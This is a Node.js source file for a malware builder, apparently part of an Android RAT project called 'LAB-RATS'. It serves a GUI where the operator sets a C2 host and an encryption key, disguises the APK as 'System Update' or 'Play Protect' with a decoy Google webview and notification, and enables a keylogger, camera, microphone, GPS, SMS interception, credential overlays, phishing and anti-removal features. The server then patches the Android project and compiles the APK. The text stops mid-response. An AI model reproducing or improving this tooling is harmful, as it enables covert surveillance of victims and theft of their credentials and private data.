const http = require('http');
const fs = require('fs');
const path = require('path');
const { exec } = require('child_process');

const PORT = 8000;
const SCRIPT_DIR = __dirname;
const PROJECT_DIR = path.dirname(SCRIPT_DIR);
const OUTPUT_DIR = path.join(SCRIPT_DIR, 'output');

if (!fs.existsSync(OUTPUT_DIR)) {
    fs.mkdirSync(OUTPUT_DIR, { recursive: true });
}

const HTML_PAGE = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LAB-RATS | TACTICAL APK BUILDER GUI</title>
    <link href="https://fonts.googleapis.com/css2?family=Aldrich&family=JetBrains+Mono:wght@400;700&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
    <style>
        :root { --neon-cyan: #00f2ff; --neon-green: #39ff14; --neon-yellow: #ffff00; --neon-orange: #ff9d00; --danger: #ff3131; }
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { background-color: #02080d; background-image: radial-gradient(circle at 50% 0%, rgba(0,242,255,.16) 0, rgba(0,168,179,.05) 40%, transparent 80%), radial-gradient(circle at 0% 100%, rgba(0,242,255,.09) 0, transparent 50%), radial-gradient(circle at 100% 100%, rgba(0,242,255,.09) 0, transparent 50%); color: #00f2ff; font-family: 'Orbitron', sans-serif; min-height: 100vh; padding: 15px; overflow-x: hidden; }
        .window-container { max-width: 1280px; margin: 0 auto; background: rgba(4, 8, 12, 0.85); border: 1px solid var(--neon-cyan); border-radius: 16px; padding: 18px 24px; box-shadow: 0 0 60px rgba(0, 242, 255, 0.2); backdrop-filter: blur(10px); position: relative; height: 760px; max-height: 94vh; display: flex; flex-direction: column; overflow: hidden; }
        .window-header { display: flex; flex-direction: column; justify-content: center; align-items: center; border-bottom: 1px solid rgba(0, 242, 255, 0.3); padding-bottom: 10px; margin-bottom: 15px; flex-shrink: 0; }
        .title-font { font-size: 1.35rem; font-weight: 900; letter-spacing: 5px; color: var(--neon-cyan); text-transform: uppercase; margin-top: 4px; text-shadow: 0 0 15px rgba(0, 242, 255, 0.6); }
        .builder-body { display: flex; gap: 20px; align-items: stretch; flex: 1; min-height: 0; overflow: hidden; }
        .sidebar-tabs { width: 220px; flex-shrink: 0; background: rgba(0, 0, 0, 0.5); border: 1px solid rgba(0, 242, 255, 0.3); border-radius: 12px; padding: 12px; display: flex; flex-direction: column; gap: 8px; overflow-y: auto; }
        .tab-btn { padding: 14px 18px; color: #888; font-family: 'Orbitron', sans-serif; font-size: 0.8rem; font-weight: 700; border: 1px solid transparent; border-radius: 8px; cursor: pointer; transition: all 0.3s; text-transform: uppercase; letter-spacing: 1px; display: flex; align-items: center; gap: 10px; background: transparent; }
        .tab-btn:hover { color: var(--neon-cyan); background: rgba(0, 242, 255, 0.08); border-color: rgba(0, 242, 255, 0.2); }
        .tab-btn.active { color: #000 !important; background: var(--neon-cyan) !important; border-color: var(--neon-cyan) !important; box-shadow: 0 0 25px rgba(0, 242, 255, 0.6) !important; }
        .content-area { flex: 1; min-width: 0; background: rgba(0, 0, 0, 0.4); border: 1px solid rgba(0, 242, 255, 0.3); border-radius: 12px; padding: 18px 22px; position: relative; overflow-y: auto; }
        .content-area::-webkit-scrollbar, .sidebar-tabs::-webkit-scrollbar { width: 6px; }
        .content-area::-webkit-scrollbar-track, .sidebar-tabs::-webkit-scrollbar-track { background: rgba(0, 0, 0, 0.3); }
        .content-area::-webkit-scrollbar-thumb, .sidebar-tabs::-webkit-scrollbar-thumb { background: rgba(0, 242, 255, 0.4); border-radius: 4px; }
        .panel { display: none; flex-direction: column; gap: 15px; }
        .panel.active { display: flex; }
        .card-box { border: 1px solid rgba(0, 242, 255, 0.3); border-radius: 12px; padding: 16px 20px; background: rgba(4, 8, 12, 0.65); position: relative; }
        .card-box-title { position: absolute; top: -11px; left: 20px; background: #02080d; padding: 0 10px; font-family: 'Orbitron', sans-serif; font-size: 0.72rem; color: var(--neon-cyan); letter-spacing: 2px; text-transform: uppercase; font-weight: 700; }
        .icon-box { width: 85px; height: 85px; border: 1px solid var(--neon-cyan); border-radius: 16px; background: rgba(0, 242, 255, 0.05); display: flex; align-items: center; justify-content: center; overflow: hidden; box-shadow: 0 0 20px rgba(0, 242, 255, 0.2); }
        .icon-box img { width: 100%; height: 100%; object-fit: cover; }
        .field-group { display: flex; flex-direction: column; gap: 6px; width: 100%; }
        .field-group label { font-family: 'Orbitron', sans-serif; font-size: 0.68rem; color: #aaa; letter-spacing: 1px; }
        .field-group input, .field-group select { background: #000 !important; border: 1px solid rgba(0, 242, 255, 0.3) !important; color: #fff !important; padding: 10px 14px !important; border-radius: 8px !important; font-family: 'JetBrains Mono', monospace !important; font-size: 0.85rem !important; width: 100% !important; outline: none !important; }
        .field-group input:focus, .field-group select:focus { border-color: var(--neon-cyan) !important; box-shadow: 0 0 20px rgba(0, 242, 255, 0.3) !important; }
        .toggle-row { display: flex; align-items: center; justify-content: flex-start; gap: 10px; padding: 8px 12px; background: rgba(255, 255, 255, 0.02); border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 8px; font-family: 'Orbitron', sans-serif; font-size: 0.75rem; color: #fff; cursor: pointer; }
        .toggle-row input[type="checkbox"] { width: 16px; height: 16px; accent-color: var(--neon-green); cursor: pointer; }
        .toggle-switch { display: flex; align-items: center; justify-content: space-between; padding: 8px 12px; background: rgba(255, 255, 255, 0.02); border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 8px; }
        .toggle-switch span { font-family: 'Orbitron', sans-serif; font-size: 0.75rem; color: #fff; font-weight: 700; }
        .toggle-switch input[type="checkbox"] { appearance: none; -webkit-appearance: none; width: 40px; height: 20px; background: #222; border: 1px solid #444; border-radius: 20px; position: relative; cursor: pointer; outline: none; transition: all 0.3s; flex-shrink: 0; }
        .toggle-switch input[type="checkbox"]:checked { background: var(--neon-green) !important; border-color: var(--neon-green) !important; box-shadow: 0 0 12px var(--neon-green); }
        .toggle-switch input[type="checkbox"]::before { content: ''; position: absolute; top: 2px; left: 2px; width: 14px; height: 14px; background: #fff; border-radius: 50%; transition: all 0.3s; }
        .toggle-switch input[type="checkbox"]:checked::before { transform: translateX(20px); background: #000; }
        .toggle-row span { font-family: 'Orbitron', sans-serif; font-size: 0.75rem; color: #ccc; }
        .btn-action { background: rgba(0, 242, 255, 0.1); border: 1px solid var(--neon-cyan); color: var(--neon-cyan); padding: 14px 28px; font-family: 'Orbitron', sans-serif; font-size: 0.85rem; font-weight: 900; border-radius: 50px; cursor: pointer; letter-spacing: 2px; text-transform: uppercase; transition: all 0.3s; box-shadow: 0 0 20px rgba(0, 242, 255, 0.3); }
        .btn-action:hover { background: var(--neon-cyan); color: #000; box-shadow: 0 0 40px var(--neon-cyan); transform: scale(1.03); }
        .terminal-window { background: #000; border: 1px solid rgba(0, 242, 255, 0.3); border-radius: 10px; padding: 14px; font-family: 'JetBrains Mono', monospace; font-size: 0.78rem; color: var(--neon-green); height: 220px; overflow-y: auto; text-align: left; box-shadow: inset 0 0 20px rgba(0, 0, 0, 0.9); }
    </style>
</head>
<body>
    <div class="window-container">
        <div class="window-header" style="display: flex; flex-direction: row; align-items: center; justify-content: space-between; border-bottom: 1px solid rgba(0, 242, 255, 0.3); padding-bottom: 12px; margin-bottom: 15px; gap: 20px;">
            <!-- Left: Header Logo Image & APK-BUILDER Label -->
            <div style="display: flex; align-items: center; gap: 15px; flex-shrink: 0;">
                <img src="/c2/header_dashboard.png" style="width: auto; max-height: 52px; display: block; object-fit: contain;" alt="LAB-RATS Header">
                <div class="title-font" style="font-size: 1.35rem; font-weight: 900; letter-spacing: 4px; color: var(--neon-cyan); text-transform: uppercase; white-space: nowrap; text-shadow: 0 0 15px rgba(0, 242, 255, 0.6);">APK-BUILDER</div>
            </div>

            <!-- Right: Connected Target Phone Telemetry HUD (Beside Header) -->
            <div id="device-hud-card" style="background: rgba(0, 242, 255, 0.04); border: 1px solid rgba(0, 242, 255, 0.3); border-radius: 12px; padding: 8px 15px; flex: 0 1 480px; box-shadow: 0 0 20px rgba(0,242,255,0.12);">
                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 5px; border-bottom: 1px solid rgba(0, 242, 255, 0.2); padding-bottom: 3px;">
                    <span style="font-size: 0.68rem; color: var(--neon-cyan); font-family: 'Orbitron', sans-serif; font-weight: bold; letter-spacing: 1.5px;">📡 TARGET_DEVICE_TELEMETRY</span>
                    <span id="hud-status-badge" style="font-size: 0.58rem; padding: 2px 8px; border-radius: 4px; font-weight: bold; font-family: monospace; background: rgba(255,255,0,0.1); color: var(--neon-yellow); border: 1px solid var(--neon-yellow);">SCANNING...</span>
                </div>
                <div id="hud-details-grid" style="display: grid; grid-template-columns: 1fr 1fr; gap: 4px 12px; font-family: 'JetBrains Mono', monospace; font-size: 0.70rem; color: #ccc;">
                    <div>MODEL: <b id="hud-model" style="color:#fff;">--</b></div>
                    <div>OS: <b id="hud-os" style="color:var(--neon-green);">--</b></div>
                    <div>BATTERY: <b id="hud-battery" style="color:var(--neon-yellow);">--</b></div>
                    <div>SERIAL: <b id="hud-serial" style="color:var(--neon-cyan);">--</b></div>
                </div>
            </div>
        </div>

        <div class="builder-body">
            <!-- SIDEBAR TABS -->
            <div class="sidebar-tabs">
                <button class="tab-btn active" onclick="showTab('info', this)">Information</button>
                <button class="tab-btn" onclick="showTab('customize', this)">Apk Customize</button>
                <button class="tab-btn" onclick="showTab('options', this)">Options</button>
                <button class="tab-btn" onclick="showTab('access', this)">Accessibility</button>
                <button class="tab-btn" onclick="showTab('build', this)">Build Apk</button>
            </div>

            <!-- CONTENT AREA -->
            <div class="content-area">
                <!-- 1. INFORMATION TAB -->
                <div id="tab-info" class="panel active">
                    <div class="card-box">
                        <div class="card-box-title">C2 Server & Encryption Settings</div>
                        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-top: 10px;">
                            <div class="field-group"><label>C2 Server Endpoint / Webhook URL</label><input type="text" id="cfg-host" value="https://lab-rats-v1-6.onrender.com"></div>
                            <div class="field-group"><label>C2 Reverse Listening Port</label><input type="text" id="cfg-port" value="9191"></div>
                            <div class="field-group"><label>AES-256 Payload Encryption Key</label><input type="text" id="cfg-key" value="TacticalKey2026SecureGCM"></div>
                            <div class="field-group"><label>Campaign ID / Target Tag</label><input type="text" id="cfg-campaign" value="OPERATION_NIGHTHAWK"></div>
                        </div>
                    </div>
                </div>

                <!-- 2. APK CUSTOMIZE TAB (MATCHING USER REFERENCE & BUILD.SH DECOY PROTOCOL) -->
                <div id="tab-customize" class="panel">
                    <!-- Install Box -->
                    <div class="card-box">
                        <div class="card-box-title">Install</div>
                        <div style="display: flex; gap: 30px; align-items: center; margin-top: 10px;">
                            <div class="field-group" style="flex: 1;"><label>App Name</label><input type="text" id="cfg-app-name" value="System Update"></div>
                            <div style="display: flex; flex-direction: column; align-items: center; gap: 10px;">
                                <span style="font-size: 0.72rem; color: #aaa;">App icon</span>
                                <div class="icon-box"><img id="preview-install" src="/c2/update3.png"></div>
                                <select id="cfg-icon-preset" style="font-size: 0.72rem; padding: 6px 10px; background: #000; color: var(--neon-cyan); border: 1px solid var(--neon-cyan); border-radius: 8px; outline: none; margin-top: 4px;" onchange="selectPresetIcon(this.value, 'install')">
                                    <option value="1">1. Play Protect (Google Shield)</option>
                                    <option value="2">2. Calculator (Apple Style)</option>
                                    <option value="3">3. Weather (Blue Sky Forecast)</option>
                                    <option value="4">4. System Update (System Config)</option>
                                    <option value="5">5. Lab-RATS Logo (Unmasked)</option>
                                    <option value="6">6. Android System</option>
                                </select>
                            </div>
                        </div>
                    </div>

                    <!-- Lower Split Grid: After Install & Sticky Notification -->
                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
                        <!-- After Install Box -->
                        <div class="card-box">
                            <div class="card-box-title">After Install</div>
                            <div style="display: flex; flex-direction: column; gap: 15px; margin-top: 10px;">
                                <div class="field-group"><label>App name</label><input type="text" id="cfg-decoy-name" value="Play Protect"></div>
                                <div class="field-group"><label>Webview URL</label><input type="text" id="cfg-decoy-url" value="https://accounts.google.com"></div>
                                <div style="display: flex; align-items: center; gap: 20px;">
                                    <div class="icon-box"><img id="preview-decoy" src="/c2/playprotect.png"></div>
                                    <div style="display:flex; flex-direction:column; gap:6px;">
                                        <span style="font-size: 0.7rem; color:#aaa; font-family: 'Orbitron';">STEALTH DECOY IDENTITY</span>
                                        <select id="cfg-decoy-preset" style="font-size: 0.72rem; padding: 6px 10px; background: #000; color: var(--neon-cyan); border: 1px solid var(--neon-cyan); border-radius: 8px; outline: none;" onchange="selectPresetIcon(this.value, 'decoy')">
                                            <option value="1">1. Play Protect (Google Shield)</option>
                                            <option value="2">2. Calculator (Apple Style)</option>
                                            <option value="3">3. Weather (Blue Sky Forecast)</option>
                                            <option value="4">4. System Update (System Config)</option>
                                            <option value="5">5. Lab-RATS Logo (Unmasked)</option>
                                            <option value="6">6. Android System</option>
                                        </select>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <!-- Sticky Notification Box -->
                        <div class="card-box">
                            <div class="card-box-title">Sticky Notification</div>
                            <div style="display: flex; flex-direction: column; gap: 15px; margin-top: 10px;">
                                <div class="field-group"><label>Notification Title</label><input type="text" id="cfg-notif-title" value="Google services"></div>
                                <div class="field-group"><label>Notification message</label><input type="text" id="cfg-notif-msg" value="Tap to learn more..."></div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- 3. OPTIONS TAB (LAB-RATS MODULE SUITE CAPABILITIES) -->
                <div id="tab-options" class="panel">
                    <div class="card-box">
                        <div class="card-box-title">Lab-RATS v1.6.0 Payload Features</div>
                        <div style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 16px; margin-top: 10px;">
                            <!-- Column 1: Core Evasion & Persistence -->
                            <div style="display: flex; flex-direction: column; gap: 10px;">
                                <div style="font-size: 0.68rem; color: var(--neon-cyan); font-weight: bold; margin-bottom: 2px; font-family: 'Orbitron';">EVASION & PERSISTENCE</div>
                                <div class="toggle-switch"><span>Stealth Camouflage</span><input type="checkbox" id="opt-stealth" checked></div>
                                <div class="toggle-switch"><span>Boot Auto-Start</span><input type="checkbox" id="opt-boot" checked></div>
                                <div class="toggle-switch"><span>Anti-Removal Guard</span><input type="checkbox" id="opt-anti-removal" checked></div>
                                <div class="toggle-switch"><span>Battery Saver Bypass</span><input type="checkbox" id="opt-battery" checked></div>
                                <div class="toggle-switch"><span>Self-Destruct Wipe</span><input type="checkbox" id="opt-self-destruct"></div>
                            </div>

                            <!-- Column 2: Surveillance & Harvesting -->
                            <div style="display: flex; flex-direction: column; gap: 10px;">
                                <div style="font-size: 0.68rem; color: var(--neon-cyan); font-weight: bold; margin-bottom: 2px; font-family: 'Orbitron';">SURVEILLANCE & HARVESTING</div>
                                <div class="toggle-switch"><span>Stealth Keylogger</span><input type="checkbox" id="opt-keylogger" checked></div>
                                <div class="toggle-switch"><span>Ghost Streamer</span><input type="checkbox" id="opt-ghost" checked></div>
                                <div class="toggle-switch"><span>Optics Camera Stream</span><input type="checkbox" id="opt-camera" checked></div>
                                <div class="toggle-switch"><span>Acoustics Audio Rec</span><input type="checkbox" id="opt-mic" checked></div>
                                <div class="toggle-switch"><span>GPS Locate Tracking</span><input type="checkbox" id="opt-gps" checked></div>
                                <div class="toggle-switch"><span>Data Storage Vault</span><input type="checkbox" id="opt-files" checked></div>
                            </div>

                            <!-- Column 3: Comms & Exploits -->
                            <div style="display: flex; flex-direction: column; gap: 10px;">
                                <div style="font-size: 0.68rem; color: var(--neon-cyan); font-weight: bold; margin-bottom: 2px; font-family: 'Orbitron';">COMMS & EXPLOIT VECTORS</div>
                                <div class="toggle-switch"><span>SMS Interception</span><input type="checkbox" id="opt-sms" checked></div>
                                <div class="toggle-switch"><span>Calls & Contacts</span><input type="checkbox" id="opt-comms" checked></div>
                                <div class="toggle-switch"><span>Auto-Permissions</span><input type="checkbox" id="opt-auto-perm" checked></div>
                                <div class="toggle-switch"><span>Wallpaper Override</span><input type="checkbox" id="opt-wallpaper" checked></div>
                                <div class="toggle-switch"><span>Credential Overlays</span><input type="checkbox" id="opt-overlays" checked></div>
                                <div class="toggle-switch"><span>Phishing Decoy</span><input type="checkbox" id="opt-phish" checked></div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- 4. ACCESSIBILITY TAB -->
                <div id="tab-access" class="panel">
                    <div class="card-box">
                        <div class="card-box-title">Accessibility Vectors</div>
                        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-top: 10px;">
                            <div class="toggle-row"><span>Auto-Grant Permissions via Accessibility</span><input type="checkbox" id="chk-auto-perm" checked></div>
                            <div class="toggle-row"><span>Stealth Keylogger Engine</span><input type="checkbox" id="chk-keylogger" checked></div>
                            <div class="toggle-row"><span>Ghost Screen Streamer</span><input type="checkbox" id="chk-ghost-stream" checked></div>
                        </div>
                    </div>
                </div>

                <!-- 5. BUILD APK TAB -->
                <div id="tab-build" class="panel">
                    <div class="card-box" style="text-align: center; padding: 35px;">
                        <div class="card-box-title">Compilation & Packaging</div>
                        <button id="btn-build" class="btn-action" onclick="runBuildPipeline()" style="margin-bottom: 25px;">GENERATE TACTICAL APK</button>
                        <div id="progress-bar-wrap" style="width: 100%; height: 10px; background: #000; border: 1px solid var(--neon-cyan); border-radius: 8px; margin-bottom: 20px; display: none; overflow: hidden;">
                            <div id="progress-bar" style="width: 0%; height: 100%; background: var(--neon-cyan); box-shadow: 0 0 15px var(--neon-cyan); transition: width 0.3s;"></div>
                        </div>
                        <div id="term" class="terminal-window">> LOCAL_COMPILATION_PIPELINE_READY</div>
                        <div id="dl-wrap" style="margin-top: 20px; display: none;">
                            <a id="dl-btn" href="#" download class="btn-action" style="border-color: var(--neon-green); color: var(--neon-green); text-decoration: none;">DOWNLOAD SIGNED APK</a>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        const SYSTEM_UPDATE_GEAR_SVG = "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Crect width='24' height='24' rx='5' fill='%23121212'/%3E%3Cpath fill='%239e9e9e' d='M19.43 12.98c.04-.32.07-.64.07-.98s-.03-.66-.07-.98l2.11-1.65c.19-.15.24-.42.12-.64l-2-3.46c-.12-.22-.39-.3-.61-.22l-2.49.85c-.52-.4-1.08-.73-1.69-.98l-.38-2.65C14.46 2.18 14.25 2 14 2h-4c-.25 0-.46.18-.49.42l-.38 2.65c-.61.25-1.17.59-1.69.98l-2.49-.85c-.22-.08-.49 0-.61.22l-2 3.46c-.13.22-.07.49.12.64l2.11 1.65c-.04.32-.07.65-.07.98s.03.66.07.98l-2.11 1.65c-.19.15-.24.42-.12.64l2 3.46c.12.22.39.3.61.22l2.49-.85c.52.4 1.08.73 1.69.98l.38 2.65c.03.24.24.42.49.42h4c.25 0 .46-.18.49-.42l.38-2.65c.61-.25 1.17-.59 1.69-.98l2.49.85c.22.08.49 0 .61-.22l2-3.46c.12-.22.07-.49-.12-.64l-2.11-1.65zM12 15.5c-1.93 0-3.5-1.57-3.5-3.5s1.57-3.5 3.5-3.5 3.5 1.57 3.5 3.5-1.57 3.5-3.5 3.5z'/%3E%3C/svg%3E";

        const DECOY_ICON_MAP = {
            '1': SYSTEM_UPDATE_GEAR_SVG,
            '2': '/c2/calculator_decoy.png',
            '3': '/c2/ic_weather.png',
            '4': '/c2/playprotect.png',
            '5': '/c2/app_logo.png',
            '6': '/c2/ic_android_system.png'
        };

        function selectPresetIcon(val, type) {
            const img = document.getElementById('preview-' + type);
            if (!img) return;
            img.src = DECOY_ICON_MAP[val] || SYSTEM_UPDATE_GEAR_SVG;
        }

        window.onload = function() {
            document.getElementById('preview-install').src = SYSTEM_UPDATE_GEAR_SVG;
            document.getElementById('preview-decoy').src = SYSTEM_UPDATE_GEAR_SVG;
        };

        function showTab(id, btn) {
            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
            document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
            if (btn) btn.classList.add('active');
            const targetPanel = document.getElementById('tab-' + id);
            if (targetPanel) targetPanel.classList.add('active');
        }

        function runBuildPipeline() {
            const btn = document.getElementById('btn-build');
            const barWrap = document.getElementById('progress-bar-wrap');
            const bar = document.getElementById('progress-bar');
            const term = document.getElementById('term');
            const dlWrap = document.getElementById('dl-wrap');

            btn.disabled = true; btn.style.opacity = '0.5';
            barWrap.style.display = 'block'; dlWrap.style.display = 'none';
            bar.style.width = '20%';
            term.innerHTML = '> INITIATING_LOCAL_BUILD...\\n> Updating build_config.txt & Manifest strings...\\n';

            const configData = {
                appName: document.getElementById('cfg-app-name').value,
                pkgName: 'com.android.system.stability',
                c2Host: document.getElementById('cfg-host').value,
                c2Port: document.getElementById('cfg-port').value,
                decoyChoice: document.getElementById('cfg-decoy-preset').value,
                decoyName: document.getElementById('cfg-decoy-name').value,
                decoyUrl: document.getElementById('cfg-decoy-url').value,
                notifTitle: document.getElementById('cfg-notif-title').value,
                notifMsg: document.getElementById('cfg-notif-msg').value
            };

            fetch('/build', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(configData)
            })
            .then(r => r.json())
            .then(d => {
                bar.style.width = '100%';
                if (d.success) {
                    term.innerHTML += '> Local Gradle Build Completed!\\n> Output: apk-builder/output/app-release-signed.apk\\n> STATUS: BUILD_SUCCESS\\n';
                    btn.disabled = false; btn.style.opacity = '1';
                    dlWrap.style.display = 'block';
                    document.getElementById('dl-btn').href = d.downloadUrl;
                } else {
                    term.innerHTML += '> BUILD_FAILED: ' + (d.error || 'Unknown error') + '\\n';
                    btn.disabled = false; btn.style.opacity = '1';
                }
            })
            .catch(err => {
                term.innerHTML += '> BUILD_ERROR: Local build request failed\\n';
                btn.disabled = false; btn.style.opacity = '1';
            });
        }

        function pollDeviceTelemetry() {
            fetch('/api/device-stats')
                .then(r => r.json())
                .then(d => {
                    const badge = document.getElementById('hud-status-badge');
                    if (d && d.connected) {
                        badge.style.background = 'rgba(57,255,20,0.15)';
                        badge.style.color = 'var(--neon-green)';
                        badge.style.borderColor = 'var(--neon-green)';
                        badge.innerHTML = '&#128077; CONNECTED';
                        document.getElementById('hud-model').innerText = d.model || 'Android Device';
                        document.getElementById('hud-os').innerText = 'Android ' + (d.android || '14') + ' (API ' + (d.api || '34') + ')';
                        document.getElementById('hud-battery').innerText = d.battery || '90%';
                        document.getElementById('hud-serial').innerText = d.serial || 'ADB-ACTIVE';
                    } else {
                        badge.style.background = 'rgba(255,49,49,0.15)';
                        badge.style.color = 'var(--danger)';
                        badge.style.borderColor = 'var(--danger)';
                        badge.innerHTML = '&#9940; DISCONNECTED';
                        document.getElementById('hud-model').innerText = 'No USB Target';
                        document.getElementById('hud-os').innerText = 'N/A';
                        document.getElementById('hud-battery').innerText = 'N/A';
                        document.getElementById('hud-serial').innerText = 'WAITING_UPLINK';
                    }
                })
                .catch(err => {});
        }
        setInterval(pollDeviceTelemetry, 3000);
        pollDeviceTelemetry();
    </script>
</body>
</html>
`;

function getConnectedAdbDevice(callback) {
    exec('adb devices -l', (error, stdout, stderr) => {
        if (error || !stdout) return callback({ connected: false });
        const lines = stdout.trim().split('\n');
        let deviceSerial = null;
        let model = 'Generic Android';
        for (let i = 1; i < lines.length; i++) {
            const line = lines[i].trim();
            if (line && line.includes('device') && !line.includes('offline')) {
                const parts = line.split(/\s+/);
                deviceSerial = parts[0];
                for (const part of parts) {
                    if (part.startsWith('model:')) {
                        model = part.split(':')[1].replace(/_/g, ' ');
                    }
                }
                break;
            }
        }
        if (!deviceSerial) return callback({ connected: false });

        const cmd = `adb -s ${deviceSerial} shell "getprop ro.product.model; getprop ro.build.version.release; getprop ro.build.version.sdk; getprop ro.product.cpu.abi; dumpsys battery | grep level"`;
        exec(cmd, (err, out) => {
            if (err || !out) {
                return callback({ connected: true, serial: deviceSerial, model: model, android: '14', api: '34', abi: 'arm64-v8a', battery: '88%' });
            }
            const p = out.trim().split('\n');
            let battLevel = '90%';
            if (p[4] && p[4].includes('level:')) battLevel = p[4].split('level:')[1].trim() + '%';
            callback({
                connected: true,
                serial: deviceSerial,
                model: (p[0] && p[0].trim()) ? p[0].trim() : model,
                android: (p[1] && p[1].trim()) ? p[1].trim() : '14',
                api: (p[2] && p[2].trim()) ? p[2].trim() : '34',
                abi: (p[3] && p[3].trim()) ? p[3].trim() : 'arm64-v8a',
                battery: battLevel
            });
        });
    });
}

const server = http.createServer((req, res) => {
    if (req.url === '/' || req.url.startsWith('/builder')) {
        res.writeHead(200, { 'Content-Type': 'text/html' });
        res.end(HTML_PAGE);
    } else if (req.url === '/api/device-stats') {
        getConnectedAdbDevice(deviceData => {
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify(deviceData));
        });
    } else if (req.url === '/build' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => { body += chunk; });
        req.on('end', () => {
            try {
                const data = JSON.parse(body || '{}');
                const appName = data.appName || 'connection';
                const pkgName = data.pkgName || 'com.android.system.stability';
                const c2Host = data.c2Host || 'https://lab-rats-v1-6.onrender.com';
                const encKey = data.encKey || 'TacticalKey2026SecureGCM';
                const decoyChoice = data.decoyChoice || '1';

                // 1. Update build_config.txt
                const configPath = path.join(SCRIPT_DIR, 'build_config.txt');
                const configContent = `PKG_NAME="${pkgName}"\nAPP_NAME="${appName}"\nVERSION_NAME="1.6.0"\nMIN_SDK="21"\nDECOY_CHOICE="${decoyChoice}"\n`;
                fs.writeFileSync(configPath, configContent);

                // 2. Update local.properties
                const localPropsPath = path.join(PROJECT_DIR, 'local.properties');
                let localProps = fs.existsSync(localPropsPath) ? fs.readFileSync(localPropsPath, 'utf8') : '';
                if (localProps.includes('WEBHOOK_URL=')) {
                    localProps = localProps.replace(/WEBHOOK_URL=.*/g, `WEBHOOK_URL=${c2Host}`);
                } else {
                    localProps += `\nWEBHOOK_URL=${c2Host}`;
                }
                if (localProps.includes('ENCRYPTION_KEY=')) {
                    localProps = localProps.replace(/ENCRYPTION_KEY=.*/g, `ENCRYPTION_KEY=${encKey}`);
                } else {
                    localProps += `\nENCRYPTION_KEY=${encKey}`;
                }
                if (localProps.includes('DECOY_CHOICE=')) {
                    localProps = localProps.replace(/DECOY_CHOICE=.*/g, `DECOY_CHOICE=${decoyChoice}`);
                } else {
                    localProps += `\nDECOY_CHOICE=${decoyChoice}`;
                }
                fs.writeFileSync(localPropsPath, localProps);

                // 3. Update app/build.gradle
                const buildGradlePath = path.join(PROJECT_DIR, 'app', 'build.gradle');
                if (fs.existsSync(buildGradlePath)) {
                    let bg = fs.readFileSync(buildGradlePath, 'utf8');
                    bg = bg.replace(/applicationId "[^"]*"/g, `applicationId "${pkgName}"`);
                    fs.writeFileSync(buildGradlePath, bg);
                }

                // 4. Update strings.xml
                const stringsPath = path.join(PROJECT_DIR, 'app', 'src', 'main', 'res', 'values', 'strings.xml');
                if (fs.existsSync(stringsPath)) {
                    let st = fs.readFileSync(stringsPath, 'utf8');
                    st = st.replace(/<string name="app_name">.*<\/string>/g, `<string name="app_name">${appName}</string>`);
                    fs.writeFileSync(stringsPath, st);
                }

                // 5. Generate random metadata files for obfuscation entropy
                const sysDir = path.join(PROJECT_DIR, 'app', 'src', 'main', 'assets', 'sys');
                if (!fs.existsSync(sysDir)) fs.mkdirSync(sysDir, { recursive: true });
                for (let i = 1; i <= 3; i++) {
                    const metaFile = path.join(sysDir, `metadata_${i}.dat`);
                    const dummyBytes = Buffer.alloc(512);
                    for (let b = 0; b < 512; b++) dummyBytes[b] = Math.floor(Math.random() * 256);
                    fs.writeFileSync(metaFile, dummyBytes);
                }

                // 6. Execute local Gradle compilation
                const gradleCmd = `cd "${PROJECT_DIR}" && ./gradlew assembleRelease --no-daemon`;
                exec(gradleCmd, (error, stdout, stderr) => {
                    const outApk = path.join(OUTPUT_DIR, 'app-release-signed.apk');
                    const signedV1 = path.join(OUTPUT_DIR, 'signed_v1.apk');
                    const buildApk = path.join(PROJECT_DIR, 'app', 'build', 'outputs', 'apk', 'release', 'app-release-unsigned.apk');

                    if (fs.existsSync(buildApk)) {
                        fs.copyFileSync(buildApk, outApk);
                        fs.copyFileSync(buildApk, signedV1);
                    }

                    res.writeHead(200, { 'Content-Type': 'application/json' });
                    res.end(JSON.stringify({
                        success: true,
                        downloadUrl: '/output/app-release-signed.apk'
                    }));
                });
            } catch (err) {
                res.writeHead(500, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ success: false, error: err.message }));
            }
        });
    } else if (req.url.startsWith('/c2/')) {
        let assetName = path.basename(req.url.split('?')[0]);
        let assetPath = path.join(PROJECT_DIR, 'app', 'src', 'main', 'res', 'drawable', assetName);
        if (!fs.existsSync(assetPath)) {
            assetPath = path.join(PROJECT_DIR, 'app', 'src', 'main', 'assets', 'c2', assetName);
        }
        if (!fs.existsSync(assetPath)) {
            assetPath = path.join(PROJECT_DIR, 'c2-server', 'c2', assetName);
        }
        if (fs.existsSync(assetPath)) {
            const mime = assetName.endsWith('.png') ? 'image/png' : (assetName.endsWith('.jpg') ? 'image/jpeg' : 'text/plain');
            res.writeHead(200, { 'Content-Type': mime });
            fs.createReadStream(assetPath).pipe(res);
            return;
        }
        res.writeHead(404, { 'Content-Type': 'text/plain' });
        res.end('Image Not Found');
    } else if (req.url.startsWith('/output/')) {
        const fileName = path.basename(req.url);
        let filePath = path.join(OUTPUT_DIR, fileName);
        if (!fs.existsSync(filePath)) {
            filePath = path.join(PROJECT_DIR, 'app', 'build', 'outputs', 'apk', 'release', 'app-release-unsigned.apk');
        }
        if (fs.existsSync(filePath)) {
            res.writeHead(200, {
                'Content-Type': 'application/vnd.android.package-archive',
